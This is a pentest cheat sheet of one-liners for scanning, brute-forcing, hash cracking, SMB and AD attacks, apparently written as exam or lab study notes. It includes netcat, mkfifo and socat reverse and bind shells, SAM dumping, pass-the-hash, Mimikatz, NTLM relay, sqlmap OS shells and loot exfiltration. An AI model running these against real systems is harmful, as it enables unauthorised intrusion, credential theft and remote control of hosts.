# CSTM Cliff Notes

Quick one-liners for common enumeration and cracking tools (replace `10.10.10.10` or credentials as needed).

## Nmap
```bash
nmap -sC -sV -oA full_scan 10.10.10.10
```
Default scripts + version detection; save to all output formats.
```bash
nmap -sT -p- -T4 -vv --open 10.10.10.10
```
Full TCP connect scan on all ports at faster timing (T4), verbose, open only.
```bash
nmap -sT -p- -vv --open 10.10.10.10
```
Full TCP connect scan on all ports, verbose, showing only open ports.
```bash
nmap -sS -Pn -n -p 1-10000 --open 10.10.10.10
```
Stealth SYN scan (no host discovery/DNS) over first 10k ports showing open only.
```bash
nmap -sS -p22,80,443,3389 -sV -O --version-all 10.10.10.10
```
Targeted SYN scan on common ports with aggressive version/O​S detection.
```bash
nmap -sS -D RND:5 -g 53 -p- --data-length 25 10.10.10.10
```
Evasion-focused SYN scan with decoys, source port 53, all ports, padded packets.
```bash
nmap -sU --top-ports 50 -sV --reason 10.10.10.10
```
Top UDP ports with version detection and reason for state.
```bash
nmap -sU -p 53,67,123,161,445 --open -Pn 10.10.10.10
```
Targeted UDP scan on common services; show open only; skip ping.
```bash
nmap -A -sV -sC -p- -T3 10.10.10.10
```
Aggressive full-port scan with scripts, versions, and OS detection (balanced timing).
```bash
nmap -A -p 80,443,8080 --script=http-* 10.10.10.10
```
Aggressive scan plus HTTP-focused NSE scripts against common web ports.
```bash
nmap -sV --script=vuln -p 21,22,80,139,445 10.10.10.10
```
Version detection with "vuln" script category on key service ports.
```bash
nmap -sn 10.10.10.0/24
```
Ping sweep (no port scan) across a subnet to discover live hosts.
```bash
nmap -PS80,443 -PA3389 -PE -PP -PU161 10.10.10.10
```
Host discovery using TCP SYN/ACK, ICMP echo/timestamp, and UDP probes.
```bash
nmap -p 80 --script=http-title,http-headers,http-methods 10.10.10.10
```
Focused HTTP enumeration on a single port with common web NSE scripts.
```bash
nmap --script=smb-enum-shares,smb-enum-users -p 139,445 10.10.10.10
```
SMB share/user enumeration using NSE.
```bash
nmap -sV --traceroute --reason -oA audit_scan 10.10.10.10
```
Version detect plus traceroute and reasons; save all outputs for an audit.

## smbclient ("smbconnect")
```bash
smbclient -L //10.10.10.10 -U demo%Password123!
```
List shares with provided credentials (use `-N` for anonymous).
```bash
smbclient -N -L //10.10.10.10
```
Anonymous share list (no password prompt).
```bash
smbclient //10.10.10.10/public -U demo%Password123! -c "recurse;ls"
```
Connect to a share and recursively list contents.
```bash
smbclient //10.10.10.10/public -U demo%Password123! -c "get file.txt"
```
Download a specific file from a share.
```bash
smbclient //10.10.10.10/public -U demo%Password123! -c "put local.txt remote.txt"
```
Upload a local file to the share with a new name.
```bash
smbclient //10.10.10.10/public -U demo%Password123! -c "prompt off;recurse; mget *"
```
Disable prompts and recursively download everything from the share.
```bash
smbclient //10.10.10.10/public -U demo%Password123! -m SMB2 -c "ls"
```
Force SMB protocol version (e.g., SMB2) when enumerating.

## Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V
```
SSH brute-force with user/password lists, 4 threads, verbose per attempt.
```bash
hydra -l admin -P passwords.txt smb://10.10.10.10 -V
```
Single user against SMB service with a password list.
```bash
hydra -L users.txt -P passwords.txt http-post-form "10.10.10.10/login.php:user=^USER^&pass=^PASS^:F=Invalid" -f -t 8
```
Web form brute-force, stop after first found (`-f`) using 8 threads.
```bash
hydra -S -s 443 -L users.txt -P passwords.txt https-get://10.10.10.10/ -t 6 -W 3
```
HTTPS GET auth brute force on port 443 with SSL (`-S`), threads, and wait time.
```bash
hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -t 4 -f
```
Brute-force RDP and stop after first valid credential.
```bash
hydra -C creds.txt ftp://10.10.10.10 -V -I
```
Use `user:pass` combo file for FTP; `-I` continues on connection errors.
```bash
hydra -M targets.txt -L users.txt -P passwords.txt ssh -T 4 -o found_creds.txt
```
Parallel SSH brute force across multiple targets listed in `targets.txt`.
```bash
hydra -l admin -p Password123! mysql://10.10.10.10/dbname -e nsr
```
Try null, same-as-user, and reverse logins (`-e nsr`) for MySQL DB auth.

## showmount
```bash
showmount -e 10.10.10.10
```
List exported NFS shares on the target.
```bash
showmount -a 10.10.10.10
```
Show all clients that have mounted NFS exports.
```bash
sudo mount -t nfs 10.10.10.10:/exports/share /mnt/nfs -o vers=3,ro
```
Mount a discovered NFS export read-only (pair with `showmount -e`).
```bash
sudo mount -t nfs -o nolock,proto=tcp,vers=3 10.10.10.10:/home /mnt/nfs
```
Mount NFS with TCP, version 3, and disabled locking to avoid RPC issues.

## John the Ripper
```bash
john --wordlist=rockyou.txt --format=raw-md5 hashes.txt
```
Crack raw MD5 hashes using a wordlist.
```bash
john --wordlist=rockyou.txt --rules=Jumbo shadow.hashes
```
Apply default rule set to expand candidates when cracking.
```bash
john --show hashes.txt
```
Display cracked credentials for the given hash file.
```bash
john --wordlist=rockyou.txt --format=nt --session=nt_crack ntlm_hashes.txt
```
Crack NTLM hashes with saved session for resume.
```bash
john --incremental=All4 --format=raw-sha256 hashes.txt
```
Bruteforce mode using incremental charset for SHA-256 hashes.
```bash
john --wordlist=rockyou.txt --rules=Single --format=zip hashes.zip.hash
```
Try single-crack rules on ZIP archive hashes.
```bash
john --mask=?l?l?l?l?d?s --format=bcrypt hashes.txt
```
Mask attack combining letters/digits/symbol for bcrypt.

## enum4linux
```bash
enum4linux -a 10.10.10.10
```
Run all checks (users, shares, policies) against SMB host.
```bash
enum4linux -r -u demo -p Password123! 10.10.10.10
```
RID cycling with provided credentials to enumerate users.
```bash
enum4linux -S 10.10.10.10
```
List shares only.
```bash
enum4linux -U 10.10.10.10
```
Enumerate users only.
```bash
enum4linux -o 10.10.10.10
```
Pull OS information and host SID.
```bash
enum4linux -M -u demo -p Password123! 10.10.10.10
```
Enumerate machine accounts and domain info with creds.
```bash
enum4linux -A -u demo -p Password123! 10.10.10.10
```
Aggressive mode (all checks) with provided credentials.

## snmp-check
```bash
snmp-check -t 10.10.10.10 -c public
```
Basic SNMP v1/v2c enumeration with community string `public`.
```bash
snmp-check -t 10.10.10.10 -p 161 -c public -v2c -w 20
```
Specify port, version, and timeout for slower hosts.
```bash
snmp-check -t 10.10.10.10 -c private -r 3 -w 10
```
Use alternative community string with retries and shorter timeout.
```bash
snmp-check -t 10.10.10.10 -p 161 -c public -v1 -d
```
SNMPv1 enumeration with debug output.
```bash
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1
```
Quick manual SNMP walk of system OIDs when deeper detail is needed.

## netcat
```bash
nc -lvnp 4444
```
Listen verbosely on TCP port 4444.
```bash
nc -lvnp 4444 -e /bin/bash
```
Start a bind shell on port 4444 (where allowed by target).
```bash
echo "GET / HTTP/1.1\nHost: 10.10.10.10\n\n" | nc -nv 10.10.10.10 80
```
Quick HTTP banner grab over TCP.
```bash
nc -u -lvnp 4444
```
Listen for UDP traffic on port 4444.
```bash
nc -nv 10.10.10.10 4444 -e /bin/bash
```
Reverse shell back to a listener at 10.10.10.10:4444 (from compromised host).
```bash
nc -zv 10.10.10.10 1-1024
```
TCP port scan to quickly find open ports.
```bash
nc -lvnp 4444 < file.txt
```
Serve a file over a listening socket.
```bash
nc -nv 10.10.10.10 4444 > received.txt
```
Receive file from a netcat listener.
```bash
mkfifo /tmp/f; nc -lvnp 9001 < /tmp/f | /bin/sh >/tmp/f 2>&1
```
Named-pipe reverse shell over netcat without `-e` support.

## gobuster
```bash
gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirb/common.txt -t 50 -k
```
Directory brute-force with common wordlist, 50 threads, and ignore TLS errors (`-k`).
```bash
gobuster dir -u https://10.10.10.10:8443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 60
```
Directory + extension brute force over HTTPS with medium list and aggressive threading.
```bash
gobuster vhost -u http://10.10.10.10/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 30
```
Virtual host brute force against a single IP for hidden sites.
```bash
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 80 -i
```
Subdomain enumeration with wildcard detection (`-i`).
```bash
gobuster fuzz -u "http://10.10.10.10/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -c 200
```
Simple fuzz mode replacing FUZZ with words and only showing HTTP 200 responses.
```bash
gobuster dir -u http://10.10.10.10/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -b 404,403
```
Hide common error codes (404, 403) to focus on interesting results.
```bash
gobuster dir -u http://10.10.10.10/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -l
```
Follow redirects (`-r`) and include the length of responses (`-l`) in output.

## ffuf
```bash
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
```
Fast web content fuzzing, hiding 404 responses.
```bash
ffuf -u https://10.10.10.10:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -recursion -k
```
Recursive fuzzing over HTTPS with ignore cert errors and large file list.
```bash
ffuf -u http://10.10.10.10/index.php?file=FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,302
```
Parameter fuzzing for LFI/RFI-style inputs, showing 200/302 codes.
```bash
ffuf -u http://10.10.10.10/ -H "Host: FUZZ.example.com" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 4242
```
VHost discovery by fuzzing Host header and filtering a known-size baseline (4242 bytes).
```bash
ffuf -u https://10.10.10.10/login -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w passwords.txt -fc 401
```
Credential fuzzing of login form via POST, hiding 401 responses.
```bash
ffuf -u https://10.10.10.10/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,201,204
```
API endpoint fuzzing showing common success codes.
```bash
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -rate 50
```
Rate-limit fuzzing to 50 requests per second to avoid DoS or rate limits.

## sqlmap
```bash
sqlmap -u "http://10.10.10.10/index.php?id=1" --batch --risk=2 --level=2
```
Auto SQLi detection with non-interactive defaults; moderate risk/level.
```bash
sqlmap -r request.txt --dbs --batch
```
Use saved request file (e.g., from Burp) to enumerate databases.
```bash
sqlmap -u "http://10.10.10.10/login.php" --data "user=admin&pass=test" --risk=3 --level=5 --dump
```
POST-based SQLi with higher risk/level and dump all database contents.
```bash
sqlmap -u "http://10.10.10.10/item.php?id=1" --os-shell --batch
```
Attempt OS shell via SQL injection when writable/exec path exists.
```bash
sqlmap -u "http://10.10.10.10/index.php?id=1" --technique=BEUSTQ --tor --tor-type=SOCKS5 --check-tor
```
Force specific techniques and route through Tor for stealth testing.
```bash
sqlmap -u "http://10.10.10.10/index.php?id=1" --tables -D targetdb --batch
```
List tables from a specified database.
```bash
sqlmap -u "http://10.10.10.10/index.php?id=1" --passwords --batch
```
Dump database server user password hashes.

## nikto
```bash
nikto -h http://10.10.10.10
```
Basic web server vulnerability scan against target host.
```bash
nikto -h https://10.10.10.10 -ssl -Tuning 123bde
```
Scan over SSL with specific tuning for interesting tests (1,2,3,b,d,e).
```bash
nikto -h http://10.10.10.10 -p 8080 -Plugins apache_expect_xss
```
Target nonstandard port and force a specific plugin.
```bash
nikto -h http://10.10.10.10 -Display V -o nikto_results.txt
```
Verbose output saved to a file for reporting.
```bash
nikto -h http://10.10.10.10 -mutate 4 -mutate-options /admin
```
Mutation mode to guess directories (e.g., appending `/admin`).

## crackmapexec
```bash
cme smb 10.10.10.0/24 -u user -p 'Password123!' --shares
```
Enumerate SMB shares across a subnet with provided credentials.
```bash
cme smb 10.10.10.10 -u user -p 'Password123!' --sam
```
Dump SAM hashes from a Windows host.
```bash
cme smb 10.10.10.10 -u user -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' --local-auth
```
Pass-the-hash against a local account.
```bash
cme winrm 10.10.10.10 -u user -p 'Password123!' -x "ipconfig /all"
```
Execute a command over WinRM.
```bash
cme ldap 10.10.10.10 -u user -p 'Password123!' --users
```
Enumerate AD users via LDAP.
```bash
cme smb 10.10.10.10 -u user -p 'Password123!' -M mimikatz -o COMMAND='privilege::debug'
```
Run the built-in Mimikatz module on a target host.
```bash
cme smb 10.10.10.10 -u user -p 'Password123!' --gen-relay-list relay_targets.txt
```
Generate a list of hosts suitable for SMB relay attacks.

## responder
```bash
sudo responder -I eth0 -rdw
```
Start Responder on interface eth0 capturing LLMNR/NBT-NS/MDNS with WPAD and DHCP spoofing.
```bash
sudo responder -I eth0 -wrf
```
Capture hashes only (no DHCP/HTTP) to reduce impact (`-w`, `-r`, `-f`).
```bash
sudo responder -I eth0 -A
```
Analyze mode only; does not answer queries, useful for safe checks.
```bash
sudo responder -I eth0 -rf --lm
```
Disable LLMNR/MDNS responses; capture only NetBIOS while forcing LM hash support.
```bash
python3 /usr/share/responder/tools/RunFinger.py -i 10.10.10.10
```
Fingerprint SMB/NetBIOS responses from a host before/after running Responder.
```bash
sudo python3 /usr/share/responder/tools/MultiRelay.py -t 10.10.10.10 -u ALL -d
```
Attempt SMB relay to a target using captured hashes/tokens.

## ftp
```bash
ftp 10.10.10.10
```
Interactive FTP client; log in when prompted to list and transfer files.
```bash
ftp -inv 10.10.10.10 <<'EOF'
user demo Password123!
binary
ls
mget *.zip
bye
EOF
```
Non-interactive FTP session with scripted login and downloads (binary mode for integrity).

## wget
```bash
wget http://10.10.10.10/file.iso
```
Simple file download over HTTP/S, preserving filename.
```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.10.10.10/repos/
```
Recursive pull of a directory tree while skipping parent dirs and auto-generated indexes.

## curl
```bash
curl -I http://10.10.10.10/
```
Fetch only HTTP headers to quickly identify server/banner info.
```bash
curl -k -X POST https://10.10.10.10/login -d "user=admin&pass=Password123!" -H "Content-Type: application/x-www-form-urlencoded"
```
Send POST requests over HTTPS while ignoring certificate issues for form testing.

## smbmap
```bash
smbmap -H 10.10.10.10 -u demo -p 'Password123!'
```
Enumerate SMB shares with provided credentials and list permissions.
```bash
smbmap -H 10.10.10.10 -u demo -p 'Password123!' -r 'Public/Finance'
```
Recursively list share contents within a specific path for quick triage.

## rpcclient
```bash
rpcclient -U "demo%Password123!" 10.10.10.10 -c "enumdomusers"
```
Enumerate domain users via SMB RPC using known credentials.
```bash
rpcclient -U "" -N 10.10.10.10 -c "querydominfo"
```
Anonymous RPC call to pull domain/host info when null sessions are allowed.

## nbtscan
```bash
nbtscan -r 10.10.10.0/24
```
Scan subnet for NetBIOS names, MACs, and workgroups to locate Windows hosts.
```bash
nbtscan -v 10.10.10.10
```
Verbose single-host scan to confirm NetBIOS info and status flags.

## smbget
```bash
smbget -R -a smb://10.10.10.10/public/
```
Recursively download SMB share contents anonymously (`-a`) with resume support.
```bash
smbget -R smb://10.10.10.10/private/ -u demo -p 'Password123!'
```
Authenticated recursive fetch of SMB files with credential prompts suppressed.

## mount.cifs
```bash
sudo mount -t cifs //10.10.10.10/public /mnt/smb -o username=demo,password='Password123!',rw,vers=3.0
```
Mount SMB share locally with explicit credentials, read/write, and forced SMB version.
```bash
sudo mount -t cifs //10.10.10.10/public /mnt/smb -o guest,ro,nounix
```
Guest/anonymous read-only mount that avoids UNIX extensions for compatibility.

## sshfs
```bash
sshfs user@10.10.10.10:/var/www /mnt/sshfs -o idmap=user,StrictHostKeyChecking=no
```
Mount remote SSH-accessible directory locally for quick browsing and edits.
```bash
sshfs user@10.10.10.10:/home/user /mnt/sshfs -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3
```
Resilient mount with automatic reconnects to handle flaky shells or pivots.

## xfreerdp (RDP)
```bash
xfreerdp /v:10.10.10.10 /u:demo /p:Password123! /cert:ignore /dynamic-resolution
```
Launch an RDP session while ignoring bad certs and adapting resolution dynamically.
```bash
xfreerdp /v:10.10.10.10 /u:demo /p:Password123! /drive:loot,/tmp/loot /clipboard
```
Map a local loot folder into the session and enable clipboard for easy data exfil.

## vncviewer
```bash
vncviewer 10.10.10.10:5901
```
Connect to a VNC server on display :1 using interactive password prompt.
```bash
vncviewer -Shared -QualityLevel=5 10.10.10.10:5901
```
Join an existing VNC session without kicking others and tune compression/quality.

## impacket-psexec
```bash
psexec.py demo:Password123!@10.10.10.10 cmd.exe
```
Execute commands with a semi-interactive shell over SMB using provided creds.
```bash
psexec.py DEMO.LOCAL/demo:'Password123!'@10.10.10.10 -k -no-pass
```
Use Kerberos tickets (`-k`) for authentication when passwords are unavailable.

## impacket-wmiexec
```bash
wmiexec.py demo:Password123!@10.10.10.10 "whoami /all"
```
Run arbitrary commands via WMI without creating services (quieter than PsExec).
```bash
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c demo@10.10.10.10 "ipconfig /all"
```
Pass-the-hash execution over WMI for lateral movement without plaintext creds.

## impacket-smbserver
```bash
impacket-smbserver loot /tmp/share -smb2support
```
Host a quick SMB share backed by `/tmp/share`, forcing SMB2 for client compatibility.
```bash
impacket-smbserver loot /tmp/share -username demo -password Password123! -comment "Temp Drop"
```
Password-protected SMB drop site with custom comment for clarity in logs.

## impacket-ntlmrelayx
```bash
ntlmrelayx.py -tf targets.txt -smb2support -of relay_hashes.txt
```
Relay captured NTLM auths to SMB targets list and log hashes.
```bash
ntlmrelayx.py -t ldaps://10.10.10.10 -l ./loot -debug
```
Relay to LDAPS for AD object abuse while dumping loot folder for retrieved data.

## searchsploit
```bash
searchsploit apache 2.4.49
```
Query Exploit-DB offline for version-specific exploits.
```bash
searchsploit -m 50539
```
Mirror (copy) an exploit locally by ID for quick editing/running.

## tftp
```bash
tftp 10.10.10.10 -c get backup.cfg
```
Anonymous TFTP download of config files; note lack of authentication.
```bash
tftp 10.10.10.10 -c put shell.bin
```
Upload a file to the TFTP root when server permits writes.

## netdiscover
```bash
sudo netdiscover -r 10.10.10.0/24
```
Active/passive ARP discovery to quickly map live hosts on a LAN.
```bash
sudo netdiscover -i eth0 -p
```
Passive listen-only mode on interface eth0 to avoid generating traffic.

## arp-scan
```bash
sudo arp-scan 10.10.10.0/24
```
Fast ARP sweep to identify live hosts and vendor MAC info on a subnet.
```bash
sudo arp-scan --interface=eth0 --localnet
```
Interface-specific scan of the local network using broadcast ARP requests.

## socat
```bash
socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.10.10.10:80
```
Simple TCP port forwarder/proxy for pivoting or packet capture setups.
```bash
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
Spawn a fully interactive bash shell listener for upgrades when `nc -e` is blocked.
